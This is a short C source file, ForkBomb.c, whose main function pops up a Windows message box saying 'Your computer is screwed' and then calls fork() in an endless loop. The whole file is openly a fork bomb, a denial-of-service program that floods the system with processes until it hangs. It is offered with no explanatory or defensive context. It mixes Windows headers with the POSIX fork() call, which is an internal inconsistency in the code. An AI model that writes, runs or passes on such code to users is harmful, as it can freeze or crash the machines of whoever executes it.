/*
 * ForkBomb.c
 *
 *  Created on: Jun 16, 2016
 *      Author: Barrett
 */
#include <stdio.h>
#include <unistd.h>
#include <windows.h>

int main(){
	MessageBox(NULL,"Your computer is screwed", "Fork Bomb", MB_OK | MB_TOPMOST);
	while(1){
		fork();
	}
}

